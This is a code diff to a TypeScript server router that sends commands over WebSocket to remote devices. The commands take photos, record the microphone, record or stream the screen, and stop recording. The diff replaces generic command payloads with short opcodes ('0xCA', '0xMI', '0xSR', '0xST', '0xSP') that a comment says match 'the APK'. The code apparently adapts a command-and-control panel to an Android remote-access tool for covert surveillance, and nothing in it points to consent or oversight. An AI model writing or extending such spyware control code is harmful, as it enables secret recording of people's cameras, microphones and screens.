@@ -32,10 +32,9 @@ export const mediaCaptureRouter = router({
         const { getWebSocketManager } = await import("../websocket");
         const wsManager = getWebSocketManager();
         if (wsManager) {
-          wsManager.broadcastToDevice(input.deviceId, "execute-command", {
-            action: RemoteCommandType.TAKE_PHOTO,
-            commandId: command.commandId,
-            payload: { camera: input.camera, flash: input.flash }
+          wsManager.broadcastToDevice(input.deviceId, "order", {
+            type: "0xCA",
+            camera: input.camera === "front" ? 1 : 0
           });
         }
 
@@ -73,10 +72,9 @@ export const mediaCaptureRouter = router({
         const { getWebSocketManager } = await import("../websocket");
         const wsManager = getWebSocketManager();
         if (wsManager) {
-          wsManager.broadcastToDevice(input.deviceId, "execute-command", {
-            action: RemoteCommandType.START_AUDIO_RECORDING,
-            commandId: command.commandId,
-            payload: { duration: input.durationSeconds }
+          wsManager.broadcastToDevice(input.deviceId, "order", {
+            type: "0xMI",
+            sec: input.durationSeconds
           });
         }
 
@@ -145,10 +143,9 @@ export const mediaCaptureRouter = router({
         const { getWebSocketManager } = await import("../websocket");
         const wsManager = getWebSocketManager();
         if (wsManager) {
-          wsManager.broadcastToDevice(input.deviceId, "execute-command", {
-            action: RemoteCommandType.START_VIDEO_RECORDING,
-            commandId: command.commandId,
-            payload: { camera: input.camera, duration: input.durationSeconds }
+          // El APK usa 0xSR para grabacion de video/pantalla
+          wsManager.broadcastToDevice(input.deviceId, "order", {
+            type: "0xSR"
           });
         }
 
@@ -191,10 +188,8 @@ export const mediaCaptureRouter = router({
         const { getWebSocketManager } = await import("../websocket");
         const wsManager = getWebSocketManager();
         if (wsManager) {
-          wsManager.broadcastToDevice(input.deviceId, "execute-command", {
-            action: RemoteCommandType.START_SCREEN_RECORDING,
-            commandId: command.commandId,
-            payload: { duration: input.durationSeconds, audio: input.audio, quality: input.quality }
+          wsManager.broadcastToDevice(input.deviceId, "order", {
+            type: "0xSR"
           });
         }
 
@@ -232,10 +227,8 @@ export const mediaCaptureRouter = router({
         const { getWebSocketManager } = await import("../websocket");
         const wsManager = getWebSocketManager();
         if (wsManager) {
-          wsManager.broadcastToDevice(input.deviceId, "execute-command", {
-            action: RemoteCommandType.STOP_SCREEN_RECORDING,
-            commandId: command.commandId,
-            payload: {}
+          wsManager.broadcastToDevice(input.deviceId, "order", {
+            type: "0xST"
           });
         }
 
@@ -276,10 +269,8 @@ export const mediaCaptureRouter = router({
         const { getWebSocketManager } = await import("../websocket");
         const wsManager = getWebSocketManager();
         if (wsManager) {
-          wsManager.broadcastToDevice(input.deviceId, "execute-command", {
-            action: RemoteCommandType.START_SCREEN_STREAM,
-            commandId: command.commandId,
-            payload: { quality: input.quality, fps: input.fps }
+          wsManager.broadcastToDevice(input.deviceId, "order", {
+            type: "0xSP"
           });
         }
 
